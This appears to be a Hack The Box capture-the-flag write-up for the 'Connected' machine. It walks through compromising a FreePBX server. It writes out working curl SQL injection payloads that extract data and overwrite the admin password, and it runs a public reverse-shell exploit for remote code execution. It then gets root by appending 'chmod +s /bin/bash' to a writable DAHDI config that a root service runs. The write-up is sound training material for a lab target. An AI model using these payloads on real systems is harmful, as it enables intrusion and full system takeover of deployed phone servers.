---
title: HTB Connected Writeup
date: 2026-07-16
categories: [HTB]
tags:
  [
    Linux,
    FreePBX,
    CVE-2025-57819,
    CVE-2025-61678,
    SQLi,
    File Upload,
    RCE,
    Privilege-Escalation,
  ]
---

---

# Overview

Connected is a Linux machine centered around exploiting vulnerabilities in FreePBX. The attack begins with the discovery of an unauthenticated SQL injection vulnerability that allows modification of administrator credentials. After obtaining administrative access to the FreePBX panel, a second vulnerability is leveraged to achieve remote code execution through a malicious file upload.

Privilege escalation is accomplished by abusing a writable DAHDI configuration file that is later processed by a root-owned service. By injecting commands into the configuration and triggering the associated service restart mechanism, it becomes possible to obtain a root shell and fully compromise the system.

---

# Reconnaissance

The initial step was to identify the exposed services on the target.

```bash id="n4eg1d"
nmap -p- 10.129.24.156
```

The scan revealed the following open ports.

```text id="htj26g"
22/tcp
80/tcp
443/tcp
```

Web enumeration identified the target application as FreePBX version `16.0.40.7`.

To ensure proper name resolution during testing, the hostname was added locally.

```bash id="igpxuo"
echo "10.129.24.156 connected.htb" >> /etc/hosts
```

---

# Web Enumeration

## Identifying an SQL Injection Vulnerability

Research revealed that the installed FreePBX version was vulnerable to an unauthenticated SQL injection vulnerability affecting the Endpoint Manager module.

```text id="d2m8o9"
CVE-2025-57819
```

The vulnerable `brand` parameter could be used to inject arbitrary SQL queries.

### Confirming SQL Injection

A test payload was used to extract the current database user.

```bash id="2tyqlk"
curl -s "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
```

The response confirmed successful SQL injection.

```text id="3pqzhn"
freepbxuser@localhost
```

### Enumerating Database Columns

To better understand the authentication schema, the columns of the `ampusers` table were enumerated.

```bash id="0m7o7s"
curl -s "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT+GROUP_CONCAT(column_name)+FROM+information_schema.columns+WHERE+table_name='ampusers'),'~'))+--+"
```

The results revealed the fields used to store administrator credentials.

### Overwriting the Administrator Password

Since write operations were possible through the injection point, the administrator password was reset directly in the database.

```bash id="vvjlwm"
curl -s "http://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x';UPDATE+ampusers+SET+password_sha1=SHA1('hacked123'),password=MD5('hacked123')+WHERE+username='admin';--+"
```

With the administrator password replaced, access to the FreePBX management interface became possible.

---

# Exploitation

## Authenticating to FreePBX

The login process required a valid CSRF token.

The token was first retrieved from the login page.

```bash id="9f6n8j"
curl -s -c /tmp/c.txt http://connected.htb/admin/config.php > /tmp/p.html
TOKEN=$(grep -oP 'id="key"[^>]*>\s*\K\S+' /tmp/p.html)
```

Using the newly assigned credentials, authentication was performed.

```bash id="djlwmc"
curl -s -b /tmp/c.txt -c /tmp/c.txt \
  -X POST "http://connected.htb/admin/config.php" \
  -H "Referer: http://connected.htb/admin/config.php" \
  -d "username=admin&password=hacked123&token=$TOKEN" > /dev/null
```

The initial setup wizard was then completed.

```bash id="4c36s3"
curl -s -b /tmp/c.txt -c /tmp/c.txt \
  -X POST "http://connected.htb/admin/config.php" \
  -H "Referer: http://connected.htb/admin/config.php" \
  -d "oobeSoundLang=en&oobeGuiLang=en_US" > /dev/null
```

## Exploiting FreePBX File Upload RCE

After obtaining administrative access, a second vulnerability was leveraged.

```text id="8g87ee"
CVE-2025-61678
```

This vulnerability allows authenticated attackers to upload malicious files and achieve remote code execution.

The public exploit repository was cloned.

```bash id="0hhx2u"
git clone https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE.git
```

```bash id="jlwmjr"
cd FreePBX-CVE-2025-57819-RCE
```

Dependencies were installed.

```bash id="g8pxot"
pip install requests pwntools --break-system-packages
```

The exploit was executed against the target.

```bash id="2u9pyo"
python3 exploit.py \
  --rhost connected.htb \
  --http \
  --rport 80 \
  --lhost 10.10.15.40 \
  --lport 5555
```

Successful exploitation resulted in a shell on the target system.

---

# Initial Access

The shell was obtained as the `asterisk` user.

The user flag could then be retrieved.

```bash id="1r3w5v"
cat /home/asterisk/user.txt
```

```text id="dd25u0"
[REDACTED]
```

---

# Privilege Escalation

## DAHDI Configuration Injection

Further enumeration revealed that the DAHDI configuration file was writable by the current user.

### Verifying File Permissions

```bash id="ld6hz9"
ls -la /etc/dahdi/init.conf
```

```text id="3p8v8l"
-rw-r--r--. 1 asterisk asterisk 771 ... /etc/dahdi/init.conf
```

Since the file was owned by `asterisk`, arbitrary content could be appended.

### Injecting a Malicious Command

A payload was added to the configuration file that would grant SUID permissions to `/bin/bash`.

```bash id="gbf84v"
echo 'chmod +s /bin/bash' >> /etc/dahdi/init.conf
```

The modification was verified.

```bash id="3ggb7x"
tail -3 /etc/dahdi/init.conf
```

## Triggering the Restart Mechanism

Investigation revealed that `incrond` monitored a specific file for write events.

When triggered, the service executed a DAHDI restart operation as root. During the restart process, the modified configuration file would be processed.

To trigger the watcher, the monitored file was touched.

```bash id="1z09jr"
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

## Verifying SUID Permissions

After the restart completed, the permissions on `/bin/bash` were checked.

```bash id="7a7zw8"
ls -la /bin/bash
```

```text id="53hrd7"
-rwsr-sr-x. 1 root root 964536 ... /bin/bash
```

The presence of the SUID bit confirmed successful privilege escalation.

## Obtaining Root

A root shell was spawned using the SUID-enabled Bash binary.

```bash id="2ljr11"
/bin/bash -p
```

The effective user was verified.

```bash id="d2v3rb"
whoami
```

```text id="i5s2j5"
root
```

Finally, the root flag was retrieved.

```bash id="v8o6fw"
cat /root/root.txt
```

```text id="v0i7zu"
[REDACTED]
```

---

# Conclusion

Connected demonstrates how multiple vulnerabilities can be chained together to achieve complete system compromise. The attack began with an unauthenticated SQL injection vulnerability that allowed modification of administrator credentials within FreePBX. Administrative access was then used to exploit an authenticated file upload vulnerability, resulting in remote code execution as the `asterisk` user.

Privilege escalation was achieved by abusing a writable DAHDI configuration file that was later processed by a root-owned service. By injecting commands into the configuration and triggering the associated restart mechanism, a SUID Bash binary was created, ultimately leading to full root access.
